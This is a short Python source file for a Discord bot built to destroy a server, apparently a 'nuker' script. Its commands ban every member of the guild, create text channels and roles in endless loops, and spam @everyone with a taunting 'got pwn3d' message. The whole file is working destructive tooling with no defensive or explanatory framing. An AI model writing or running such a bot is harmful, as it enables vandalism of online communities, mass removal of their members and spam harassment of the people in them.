import discord
import asyncio
from discord.ext import commands
from discord.ext.commands import Bot
bot = commands.Bot(command_prefix='*')
@bot.command()
async def ban(ctx):
    for user in ctx.guild.members:
        await user.ban()

@bot.command()
async def channels(ctx):
    guild = ctx.message.guild
    while True:
        await guild.create_text_channel('get rekt')

@bot.command()
async def roles(ctx):
    role = ctx.guild
    while True:
        await role.create_role(name="get nuked")

@bot.command()
async def spam(ctx):
    while True:
        await ctx.send("THIS SERVER GOT PWN3D BY ME LOL @everyone @here")
bot.run("ur token")
